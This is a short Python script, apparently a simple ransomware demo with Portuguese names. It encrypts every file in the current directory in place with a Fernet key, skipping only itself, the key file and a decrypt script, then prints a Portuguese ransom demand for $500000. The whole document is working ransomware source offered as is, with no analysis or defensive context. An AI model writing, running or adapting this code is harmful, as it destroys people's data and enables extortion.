import os
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

with open("chave.key", "wb") as chave:
    chave.write(key)

for file in os.listdir():
    if file == "ransom.py" or file == "chave.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Encrypted Files: ", files)
    
for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)

print("Seus arquivos foram encriptados! Pague $500000 para receber a senha de recuperação!")